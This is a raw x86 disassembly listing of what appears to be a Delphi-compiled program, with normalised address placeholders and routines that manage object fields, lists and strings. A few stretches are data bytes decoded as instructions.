retn
cmp edi [ esi + 0x6c ]
jne r-xdata
cmp edi [ esi + 0x84 ]
jne r-xdata
mov eax esi
call sub_46d97c
xor eax eax
mov [ esi + 0x6c ] eax
jmp r-xdata
cmp edi [ esi + 0x88 ]
jne r-xdata
xor eax eax
mov [ esi + 0x84 ] eax
jmp r-xdata
xor eax eax
mov [ esi + 0x88 ] eax
sub_46d618
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0x68 ] dl
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x68 ]
cmp al [ ebp - 0x5 ]
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x1
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_46d8d4
xor eax eax
push ebp
push sub_46d816
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_46d97c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x80 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x79 ] 0x0
jne r-xdata
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xac ]
mov edx 0x1
call sub_46bee8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x70 ]
call sub_418bec
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x79 ] 0x1
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x48 ]
mov eax [ ebp - 0x4 ]
add eax 0x6c
call sub_40d3ac
mov eax [ ebp - 0x4 ]
mov [ eax + 0x80 ] 0x0
mov eax [ ebp - 0x4 ]
call sub_46da9c
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xa8 ]
mov [ eax + 0x34 ] edx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x88 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x70 ]
call sub_4671c4
mov dl 0x1
mov eax [ r-xdata ]
call sub_418100
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8c ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x88 ]
mov edx [ eax ]
call [ edx + 0x3c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x70 ]
call sub_418bec
mov edi eax
dec edi
test edi edi
jl r-xdata
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ sub_46babc ]
call sub_466280
mov edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x5c ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x81 ] 0x1
inc edi
xor esi esi
mov eax [ rw-data ]
push eax
push 0x4
mov ecx 0x4
mov edx 0xffff
mov eax ebx
call sub_466b44
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x70 ]
mov edx esi
call sub_467260
mov ebx eax
xor ecx ecx
mov edx 0x1
mov eax ebx
call sub_466a24
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x1
je r-xdata
jmp r-xdata
mov eax ebx
call sub_466c80
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x90 ]
mov eax ebx
call sub_466dbc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x70 ]
mov edx esi
call sub_467260
push eax
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_46daec
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8c ]
mov edx ebx
call sub_4181d0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
inc esi
dec edi
jne r-xdata
jmp r-xdata
sub_46d860
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x80 ] 0x0
je r-xdata
mov [ ebx + 0x6c ] esi
test esi esi
je r-xdata
lea eax [ ebx + 0x6c ]
call sub_40d3ac
mov [ ebx + 0x80 ] 0x0
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_41e7a8
sub_46d894
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x88 ] 0x0
je r-xdata
mov [ ebx + 0x88 ] esi
test esi esi
je r-xdata
cmp [ ebx + 0x81 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_41e7a8
mov [ ebx + 0x81 ] 0x0
lea eax [ ebx + 0x88 ]
call sub_40d3ac
sub_46d8d4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8c ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
call sub_418258
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_46d960
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8c ]
call sub_4182bc
retn
inc esi
xor edi edi
mov edx edi
mov eax [ ebp - 0x8 ]
call sub_417e94
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax [ ebx + 0x68 ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov eax ebx
call sub_41e634
mov eax ebx
call sub_40316c
inc edi
dec esi
jne r-xdata
sub_46d97c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46da8c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xac ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46da93
lea eax [ ebp - 0x10 ]
call sub_403f40
retn
call sub_418258
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_46da04
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46da0b
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xac ]
call sub_4182bc
retn
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_417e94
mov edi eax
mov eax [ edi + 0x68 ]
mov edx [ eax ]
call [ edx + 0x5c ]
inc esi
dec ebx
jne r-xdata
sub_46da0b
mov [ ebp - 0x9 ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa4 ]
cdq
idiv [ rw-data ]
mov ebx eax
test ebx ebx
jle r-xdata
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_465864
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xac ]
mov edx 0x1
call sub_46bee8
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46da93
lea eax [ ebp - 0x10 ]
call sub_403f40
retn
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9cc
call sub_4038f8
dec ebx
jne r-xdata
mov [ ebp - 0x9 ] 0x0
jmp r-xdata
sub_46da9c
push ebx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ ebx + 0x6c ]
pop ebx
retn
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_46c108
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x60 ]
mov [ ebx + 0x80 ] 0x1
sub_46daec
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov cl 0x1
xor edx edx
mov eax edi
call sub_46b594
mov eax [ ebp + 0x8 ]
mov [ edi + 0x68 ] eax
mov [ edi + 0x6c ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_46db38
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push j_sub_403738#3
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x6c ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x6c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_46dcac
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x6c ]
mov eax [ eax + 0x88 ]
mov ecx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov ebx eax
test ebx ebx
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x6c ]
call sub_46da9c
mov edx [ eax ]
call [ edx + 0x34 ]
mov [ ebp - 0xc ] eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov [ edx + 0x68 ] eax
mov edx ebx
call sub_46a3e0
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x68 ]
mov [ eax + 0x70 ] 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x6c ]
mov esi [ ebx + 0x98 ]
test esi esi
jle r-xdata
lea eax [ ebp - 0x8 ]
call sub_40d3ac
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x6c ]
mov eax [ eax + 0xac ]
mov edx [ ebp - 0xc ]
call sub_4181d0
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx esi
mov eax [ ebx + 0xac ]
call sub_46bee8
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x6c ]
call sub_46da9c
mov eax [ eax + 0x30 ]
mov edx [ ebp - 0xc ]
call sub_41826c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x6c ]
mov edx [ eax + 0x94 ]
mov eax [ ebp - 0x8 ]
call sub_46addc
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x58 ]
lea eax [ ebp - 0xc ]
call sub_40d3ac
jmp r-xdata
sub_46dc88
call sub_40d3ac
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x6c ]
mov ecx ebx
mov edx [ ebp - 0x4 ]
call sub_46d4e8
call sub_403974
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46dcac
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor ecx ecx
xor edx edx
mov eax edi
call sub_469b5c
mov [ edi + 0xb8 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_46dcf0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push j_sub_40360c#4
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov eax [ eax + 0x7c ]
test eax eax
je r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9cc
call sub_4038f8
mov edx [ eax ]
call [ edx + 0x3c ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x68 ]
mov eax [ ebx + 0xb8 ]
mov esi [ eax + 0x84 ]
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov eax [ eax + 0xb8 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov edx eax
mov eax ebx
call sub_46a3cc
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
sub_46dd3e
mov eax [ ebp - 0x4 ]
mov [ eax + 0xf ] 0x1
call sub_403920
call sub_403974
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x68 ]
mov eax [ ebx + 0xb8 ]
mov esi [ eax + 0x84 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov eax [ eax + 0xb8 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov edx eax
mov eax ebx
call sub_46a3cc
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
sub_46ddb8
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_46b7dc
mov eax [ ebx + 0x68 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov edx [ eax + 0xb8 ]
test edx edx
je r-xdata
lea eax [ ebx + 0x68 ]
call sub_40d3ac
mov esi edx
mov eax [ esi + 0xac ]
test eax eax
je r-xdata
mov eax esi
call sub_46da9c
test eax eax
je r-xdata
mov edx ebx
call sub_41826c
mov eax esi
call sub_46da9c
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
sub_46de0c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46df7e
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
push ebp
push j_sub_403738#4
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
push ebp
push j_sub_403738#2
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov eax [ eax + 0xb8 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9cc
call sub_4038f8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46df85
lea eax [ ebp - 0x8 ]
call sub_403f40
retn
sub_46de92
add eax [ eax ]
add [ eax ] al
enter 0x4622 0x0
scasb [ edi ]
fiadd [ esi ]
xor al 0x19
inc esi
add al ah
fiadd [ esi ]
rcr [ eax ] 0x1
inc esi
add cl bh
fiadd [ esi ]
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov eax [ eax + 0xb8 ]
mov ecx ebx
mov edx [ ebp - 0x4 ]
call sub_46d354
mov eax [ ebx + 0xc ]
add eax 0xffffd8bb
sub eax 0x2
jae r-xdata
call sub_403974
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx [ eax ]
call [ edx + 0x58 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46df85
lea eax [ ebp - 0x8 ]
call sub_403f40
retn
sub_46def9
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x68 ]
mov edx [ edx + 0xb8 ]
mov ecx eax
mov eax [ ebp - 0x4 ]
xchg edx eax
call sub_46d354
call sub_403974
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46df85
lea eax [ ebp - 0x8 ]
call sub_403f40
retn
sub_46df3b
add [ eax ] eax
add [ eax ] al
dec esp
jb r-xdata
add [ edi - 0x21 ] al
inc esi
add [ ebx + 0x528bfc55 ] cl
push 0xb8928b
add [ eax ] al
mov ecx eax
mov eax [ ebp - 0x4 ]
xchg edx eax
call sub_46d354
call sub_403920
call sub_403974
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46df85
lea eax [ ebp - 0x8 ]
call sub_403f40
retn
sub_46df8c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov eax [ r-xdata ]
push eax
mov ecx esi
xor edx edx
mov eax edi
call sub_418edc
mov [ edi + 0x1c ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_46dff0
push ebp
mov ebp esp
push ecx
mov ecx 0x4
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
xchg [ ebp - 0x4 ] ecx
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46e30d
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
call sub_403f40
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x10 ]
mov eax ebx
call sub_4080e8
mov [ ebp - 0x9 ] al
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e314
lea eax [ ebp - 0x28 ]
mov edx 0x5
call sub_403f64
lea eax [ ebp - 0x10 ]
call sub_403f40
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_46e51c
mov [ ebp - 0x14 ] eax
xor ecx ecx
push ebp
push sub_46e2e3
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x14 ]
add eax 0x10
mov edx ebx
call sub_403f94
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x1c ] edx
mov eax [ ebp - 0x14 ]
add eax 0x20
mov edx [ ebp - 0x10 ]
call sub_403f94
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x29 ] 0x0
je r-xdata
lea eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_404200
mov ecx eax
mov edx 0x1
mov eax ebx
call sub_404460
mov eax [ ebp - 0x24 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x10 ]
call sub_4080e8
mov [ ebp - 0x9 ] al
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_404200
mov edx eax
inc edx
mov ecx 0x7fffffff
mov eax ebx
call sub_404460
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_404200
mov ecx eax
inc ecx
mov edx 0x1
mov eax ebx
call sub_404460
mov eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0xc ]
call sub_404128
mov ecx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x10 ]
lea eax [ ebp - 0x1c ]
call sub_40424c
mov edx [ ebp - 0x1c ]
pop eax
call sub_4080e8
mov [ ebp - 0x9 ] al
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_404200
mov edx eax
add edx 0x2
mov ecx 0x7fffffff
mov eax ebx
call sub_404460
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ eax + 0xc ] 0x1
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
xor ecx ecx
push ebp
push j_sub_403738
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov bl [ eax + 0x28 ]
cmp bl 0x20
jne r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0xc ] 0x0
je r-xdata
lea eax [ ebp - 0x28 ]
mov edx ebx
call sub_404128
mov ecx [ ebp - 0x28 ]
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_46bd70
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x8 ]
mov ecx r-xdata
mov eax [ ebp - 0x10 ]
call sub_46bc8c
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x18 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x14 ]
call sub_46e5d8
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x34 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x68 ]
call sub_46ae38
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
call sub_40316c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x68 ]
call sub_46ae38
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x68 ]
mov edx [ eax ]
call [ edx + 0x58 ]
sub_46e1e5
add [ eax ] eax
add [ eax ] al
dec esp
jb r-xdata
add [ eax ] al
add cl dh
loope r-xdata
call sub_403920
mov ecx [ eax + 0x4 ]
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x14 ]
call sub_467e24
mov eax [ ebp - 0x14 ]
call sub_46e5d8
jmp r-xdata
inc ebp
in al dx
add [ ebx + 0x7a80ec55 ] cl
or al 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
call sub_40316c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x18 ] 0x0
je r-xdata
call sub_403974
jmp r-xdata
call sub_403920
call sub_403974
mov eax [ ebp - 0x14 ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x2c ]
test edx edx
jle r-xdata
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x68 ]
mov edx [ eax ]
call [ edx + 0x58 ]
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x18 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x14 ]
call sub_46e5d8
test edx edx
jle r-xdata
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x68 ]
mov edx [ edx + 0xb8 ]
mov edx [ edx + 0xf0 ]
mov ecx [ eax + 0x4 ]
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x14 ]
call sub_467e24
mov eax [ ebp - 0x14 ]
call sub_46e5d8
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x34 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x68 ]
call sub_46ae38
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x68 ]
call sub_46ae38
sub_46e323
inc [ ecx ]
add [ eax ] al
add [ eax ] ah
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffef8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ebx
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_46e3e7
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_418800
mov [ esi + 0xc ] 0x20
mov [ esi + 0x19 ] 0x1
lea edx [ ebp - 0x4 ]
mov eax [ esi + 0x8 ]
call sub_408388
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x108 ]
mov eax [ esi ]
call sub_4030bc
lea edx [ ebp - 0x108 ]
lea eax [ ebp - 0x8 ]
call sub_4041a4
mov edx [ ebp - 0x8 ]
lea eax [ esi + 0x1c ]
pop ecx
call sub_40424c
mov [ esi + 0x28 ] 0x20
mov [ esi + 0x29 ] 0x1
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_467aac
mov [ esi + 0x30 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov [ esi + 0x34 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e3ee
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f64
retn
add esp 0xfffffff0
call sub_403490
sub_46e40c
push ebx
push esi
call sub_4034f8
mov ebx edx
mov esi eax
lea eax [ esi + 0x34 ]
call sub_40d3ac
lea eax [ esi + 0x30 ]
call sub_40d3ac
mov edx ebx
and dl 0xfc
mov eax esi
call sub_418838
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034e0
sub_46e458
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_46e4d5
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov edx edi
mov eax ebx
call sub_4188cc
mov eax [ ebx + 0x4 ]
call sub_46dfe4
lea edx [ ebp - 0x4 ]
mov si 0xfffe
call sub_403368
push [ ebp - 0x4 ]
push r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc ]
push [ ebp - 0x8 ]
mov eax edi
mov edx 0x3
call sub_4042c0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e4dc
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f64
retn
sub_46e4e7
inc [ ecx ]
add [ eax ] al
add [ esi ] ch
add [ eax ] al
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
lea eax [ ebx + 0x1c ]
mov edx esi
call sub_403f94
mov edx esi
mov eax ebx
call sub_4189ac
pop esi
pop ebx
retn
sub_46e51c
